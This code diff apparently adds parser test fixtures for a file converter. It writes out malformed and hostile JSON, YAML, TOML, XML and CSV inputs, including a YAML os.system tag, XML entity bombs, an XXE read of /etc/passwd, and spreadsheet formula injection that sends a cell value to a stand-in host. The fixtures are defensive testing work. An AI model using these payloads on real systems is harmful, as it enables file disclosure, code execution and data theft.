@@ -891,6 +891,219 @@ trap(
     group=G,
 )
 
+# --- data: JSON, YAML, TOML, XML, CSV ---------------------------------------------------------
+# These are text, read by parsers. What goes wrong is a parser's trouble: input that never
+# ends, input that grows when read, input that asks to be run, and names that mean something
+# to the language doing the reading. Each is converted to JSON (a JSON file, to YAML).
+G = "data"
+
+trap(
+    "truncated.json",
+    b'[\n  {"id": 1, "name": "Ada"},\n  {"id": 2, "name": ',
+    "A JSON file that stops in the middle of a value, as a download cut short does.",
+    "json",
+    node="fails",
+    note="This file is not valid JSON",
+    group=G,
+)
+trap(
+    "nested-300-deep.json",
+    b"[" * 300 + b"]" * 300 + b"\n",
+    "Three hundred lists, each inside the last. Valid, and far deeper than anything written "
+    "by hand; much deeper and whatever walks it runs out of stack.",
+    "json",
+    node="fails",
+    note="The values in this file are nested too deeply",
+    group=G,
+)
+trap(
+    "proto-names.json",
+    b'{\n  "__proto__": {"polluted": true},\n  "constructor": {"prototype": {"polluted": true}},\n'
+    b'  "toString": "not a function",\n  "rows": [1, 2, 3]\n}\n',
+    "Names that mean something to JavaScript. A careless reader lets them change how every "
+    "object in the program behaves; here they are only names.",
+    "json",
+    node="succeeds",
+    group=G,
+)
+trap(
+    "byte-order-mark.json",
+    b'\xef\xbb\xbf{"name": "Ada", "born": 1815}\n',
+    "Valid JSON behind the three invisible bytes some Windows programs put at the start of a "
+    "text file.",
+    "json",
+    node="succeeds",
+    group=G,
+)
+trap(
+    "utf-16.json",
+    '{"name": "Ada"}\n'.encode("utf-16"),
+    "JSON saved as UTF-16, two bytes to a character. These formats are read as UTF-8 only, so "
+    "this is not recognised as text at all.",
+    "unknown",
+    group=G,
+)
+
+alias_bomb = "a: &a [x, x, x, x, x, x, x, x, x]\n"
+for i, name in enumerate("bcdefghi"):
+    previous = "a" if i == 0 else "bcdefghi"[i - 1]
+    alias_bomb += f"{name}: &{name} [{', '.join(['*' + previous] * 9)}]\n"
+trap(
+    "alias-bomb.yaml",
+    alias_bomb.encode(),
+    'The "billion laughs": nine short lists, each made of nine copies of the one before. Under '
+    "a kilobyte as written, hundreds of millions of values if every copy is followed.",
+    "yaml",
+    node="fails",
+    note="This file is not valid YAML",
+    group=G,
+)
+trap(
+    "asks-to-run-code.yaml",
+    b'run: !!python/object/apply:os.system ["echo owned"]\n'
+    b'call: !!js/function "function () { return 1 }"\n'
+    b"plain: stays\n",
+    "Tags that, in a careless reader, build objects or call functions as the file is read. "
+    "Here a tag builds nothing, and what it was attached to is kept as text.",
+    "yaml",
+    node="succeeds",
+    group=G,
+)
+trap(
+    "unclosed-list.yaml",
+    b"name: Ada\nfields: [mathematics, computing\nborn: 1815\n",
+    "A list that is opened and never closed.",
+    "yaml",
+    node="fails",
+    note="This file is not valid YAML",
+    group=G,
+)
+
+trap(
+    "same-name-twice.toml",
+    b'name = "Ada"\nname = "Grace"\n',
+    "One name given two values, which TOML forbids. A reader that quietly keeps one of them "
+    "has thrown data away without saying so.",
+    "toml",
+    node="fails",
+    note="This file is not valid TOML",
+    group=G,
+)
+trap(
+    "unfinished-text.toml",
+    b'title = "People"\nnote = "never closed\n',
+    "A quoted value with no closing quote.",
+    "toml",
+    node="fails",
+    note="This file is not valid TOML",
+    group=G,
+)
+
+xml_entities = b'<!ENTITY a0 "aaaaaaaaaa">'
+for i in range(1, 9):
+    xml_entities += b'<!ENTITY a%d "%s">' % (i, (b"&a%d;" % (i - 1)) * 10)
+trap(
+    "entity-bomb.xml",
+    b'<?xml version="1.0"?>\n<!DOCTYPE l [' + xml_entities + b"]>\n<l>&a8;</l>\n",
+    'The "billion laughs" in XML: eight shorthands, each standing for ten of the one before, '
+    "a gigabyte if written out in full. The shorthand is left as written, not expanded.",
+    "xml",
+    node="succeeds",
+    absent="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+    group=G,
+)
+trap(
+    "reads-a-local-file.xml",
+    b'<?xml version="1.0"?>\n<!DOCTYPE l [<!ENTITY x SYSTEM "file:///etc/passwd">]>\n<l>&x;</l>\n',
+    "Asks the reader to fetch a file from the computer and paste it into the document. A file "
+    "that names anything outside itself is refused outright.",
+    "xml",
+    node="fails",
+    note="This file is not valid XML",
+    group=G,
+)
+trap(
+    "wrong-closing-tag.xml",
+    b"<people><person><name>Ada</person></people>\n",
+    "A tag closed by a different tag. A forgiving reader guesses what was meant and returns "
+    "something; this is refused.",
+    "xml",
+    node="fails",
+    note="This file is not valid XML",
+    group=G,
+)
+trap(
+    "two-documents.xml",
+    b"<people><name>Ada</name></people>\n<people><name>Grace</name></people>\n",
+    "Two outermost tags where a document has exactly one.",
+    "xml",
+    node="fails",
+    note="This file is not valid XML",
+    group=G,
+)
+trap(
+    "web-page.xml",
+    b"<!DOCTYPE html>\n<html><head><title>x</title></head><body><p>Hello<br>there</body></html>\n",
+    "A web page with an .xml name. It begins with a tag, as XML does, and is not data.",
+    "unknown",
+    group=G,
+)
+
+trap(
+    "quote-never-closed.csv",
+    b'id,name,note\n1,Ada,"wrote the first program\n2,Grace,found the first bug\n',
+    "A quoted cell with no closing quote, which swallows the rest of the file. Refused, not "
+    "returned as one enormous cell.",
+    "csv",
+    node="fails",
+    note="A quoted value in this table is never closed",
+    group=G,
+)
+trap(
+    "spreadsheet-formulas.csv",
+    b'name,amount\nAda,"=HYPERLINK(""http://elsewhere.example/?""&A1,""Click"")"\n'
+    b"Grace,=cmd|' /C calc'!A0\nKatherine,@SUM(1+1)\n",
+    "Cells a spreadsheet program would run as formulas when the file is opened. To Omsett "
+    "they are text and are carried across unchanged.",
+    "csv",
+    node="succeeds",
+    group=G,
+)
+trap(
+    "picture-named.csv",
+    GOOD,
+    "A PNG with a .csv name. A name settles which kind of text a file is, never whether it is "
+    "text.",
+    "png",
+    node="succeeds",
+    mismatch=True,
+    group=G,
+)
+trap(
+    "table-named.png",
+    b"id,name\n1,Ada\n2,Grace\n",
+    "A table with a .png name. It is not a picture, and with a name that says it is not data "
+    "it is not offered as data.",
+    "unknown",
+    group=G,
+)
+trap(
+    "latin-1.csv",
+    "id,name\n1,Zoë\n2,Renée\n".encode("latin-1"),
+    "A table saved in an older encoding, where an accented letter is a single byte that is "
+    "not valid UTF-8. Guessing the encoding would risk garbling every name in it.",
+    "unknown",
+    group=G,
+)
+trap(
+    "notes.txt",
+    b"Shopping, Thursday\nmilk, eggs\nbread: two loaves\n",
+    "Ordinary notes that happen to have commas and colons in them. A .txt name says they are "
+    "not a table.",
+    "unknown",
+    group=G,
+)
+
 with open(os.path.join(OUT, "manifest.json"), "w") as out:
     json.dump(manifest, out, indent=2)
     out.write("\n")
